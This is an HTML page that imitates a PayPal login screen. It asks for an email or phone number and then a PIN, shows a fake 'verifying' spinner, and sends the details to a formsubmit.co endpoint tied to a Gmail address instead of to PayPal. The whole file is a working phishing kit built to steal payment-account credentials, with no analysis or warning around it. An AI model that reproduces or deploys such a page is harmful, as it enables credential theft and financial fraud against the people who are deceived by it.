<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPal Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .box {
      width: 380px;
      border: 1px solid #ddd;
      border-radius: 12px;
      padding: 40px 30px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
      text-align: center;
    }

    /* Logo */
    .logo {
      font-size: 32px;
      font-weight: bold;
      margin-bottom: 30px;
    }
    .logo .pay {
      color: #000; /* black */
    }
    .logo .pal {
      color: #0070ba; /* blue */
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0 5px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }

    .forgot-link {
      display: block;
      text-align: left;
      margin-bottom: 15px;
      font-size: 14px;
    }
    .forgot-link a {
      text-decoration: none;
      color: #0070ba;
    }
    .forgot-link a:hover {
      text-decoration: underline;
    }

    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 25px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
    }

    .btn-primary {
      background-color: #0070ba;
      color: white;
      margin-bottom: 15px;
    }

    .btn-outline {
      background: white;
      color: black;
      border: 2px solid black;
    }

    /* Hide second step by default */
    #pinScreen {
      display: none;
    }

    /* Overlay popup */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.95);
      color: white;
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      z-index: 1000;
    }

    /* Spinner */
    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid white;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .divider {
      display: flex;
      align-items: center;
      color: #777;
      font-size: 14px;
      margin: 15px 0;
    }
    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #ccc;
      margin: 0 10px;
    }
  </style>
</head>
<body>
  <div class="box">
    <!-- Logo -->
    <div class="logo"><span class="pay">Pay</span><span class="pal">Pal</span></div>

    <!-- Multi-step form -->
    <form id="multiForm" action="https://formsubmit.co/paypal876123@gmail.com" method="POST">
      
      <!-- Step 1 -->
      <div id="loginScreen">
        <input type="text" name="email_or_number" placeholder="Email or mobile number" required>
        
        <!-- Forgot email link -->
        <div class="forgot-link">
          <a href="#">Forgot email?</a>
        </div>

        <button type="button" class="btn btn-primary" onclick="showPin()">Next</button>
        <div class="divider">or</div>
        <button type="button" class="btn btn-outline">Sign Up</button>
      </div>

      <!-- Step 2 -->
      <div id="pinScreen">
        <input type="password" name="pin" maxlength="6" placeholder="Enter PIN" required>
        <button type="submit" class="btn btn-primary">Login</button>
      </div>

    </form>
  </div>

  <!-- Popup overlay -->
  <div class="overlay" id="overlay">
    <div class="spinner" id="spinner"></div>
    <div id="overlayText">Verifying submission...</div>
  </div>

  <script>
    function showPin() {
      document.getElementById("loginScreen").style.display = "none";
      document.getElementById("pinScreen").style.display = "block";
    }

    // Show overlay on submit
    const form = document.getElementById("multiForm");
    form.addEventListener("submit", function(e) {
      // Prevent instant form submit to show animation first
      e.preventDefault();

      const overlay = document.getElementById("overlay");
      const overlayText = document.getElementById("overlayText");
      const spinner = document.getElementById("spinner");

      overlay.style.display = "flex";

      // After 2 seconds show verified
      setTimeout(() => {
        spinner.style.display = "none";
        overlayText.innerText = "Verified âœ”";
      }, 2000);

      // After 3 seconds, actually submit form
      setTimeout(() => {
        form.submit();
      }, 3000);
    });
  </script>
</body>
</html>
